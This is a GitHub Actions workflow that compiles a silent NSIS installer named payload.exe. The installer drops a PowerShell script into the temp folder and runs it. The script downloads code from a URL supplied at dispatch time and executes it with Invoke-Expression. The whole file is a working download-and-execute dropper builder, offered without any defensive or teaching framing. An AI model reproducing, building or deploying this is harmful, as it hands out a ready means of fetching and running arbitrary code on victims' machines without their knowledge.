name: Build PowerShell EXE using NSIS

on:
  workflow_dispatch:
    inputs:
      payload_url:
        description: 'URL to fetch payload'
        required: true
        type: string

jobs:
  build:
    runs-on: windows-latest

    steps:
    # Step 1: Checkout repository
    - name: Checkout code
      uses: actions/checkout@v3

    # Step 2: Install NSIS
    - name: Install NSIS
      shell: powershell
      run: choco install nsis -y

    # Step 3: Generate PowerShell script dynamically
    - name: Generate PowerShell script
      shell: powershell
      run: |
        $payloadUrl = "${{ github.event.inputs.payload_url }}"
        $scriptPath = "script.ps1"
        Set-Content -Path $scriptPath -Value "function Fetch-Execute {"
        Add-Content -Path $scriptPath -Value "    param ([string]`$url)"
        Add-Content -Path $scriptPath -Value "    try {"
        Add-Content -Path $scriptPath -Value "        `$response = (New-Object System.Net.WebClient).DownloadString(`$url)"
        Add-Content -Path $scriptPath -Value "        Invoke-Expression `$response"
        Add-Content -Path $scriptPath -Value "    } catch {"
        Add-Content -Path $scriptPath -Value "        Write-Host `"Error: Cannot fetch or execute script.`""
        Add-Content -Path $scriptPath -Value "    }"
        Add-Content -Path $scriptPath -Value "}"
        Add-Content -Path $scriptPath -Value "Fetch-Execute -url `"$payloadUrl`""

    # Step 4: Generate NSIS script dynamically
    - name: Generate NSIS Script
      shell: powershell
      run: |
        $nsisPath = "script.nsi"
        Set-Content -Path $nsisPath -Value '!define OUTPUT "payload.exe"'
        Add-Content -Path $nsisPath -Value 'Outfile "${OUTPUT}"'
        Add-Content -Path $nsisPath -Value 'SilentInstall silent'
        Add-Content -Path $nsisPath -Value 'RequestExecutionLevel user'
        Add-Content -Path $nsisPath -Value 'Section'
        Add-Content -Path $nsisPath -Value '  SetOutPath $TEMP'
        Add-Content -Path $nsisPath -Value '  File "script.ps1"'
        Add-Content -Path $nsisPath -Value '  ExecDos::exec /TIMEOUT=5000 `"$WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy RemoteSigned -File "$TEMP\script.ps1"`'
        Add-Content -Path $nsisPath -Value 'SectionEnd'

    # Step 5: Compile EXE using NSIS
    - name: Build EXE using NSIS
      shell: cmd
      run: makensis script.nsi

    # Step 6: Upload generated EXE as an artifact
    - name: Upload EXE Artifact
      uses: actions/upload-artifact@v4
      with:
        name: payload_exe
        path: payload.exe






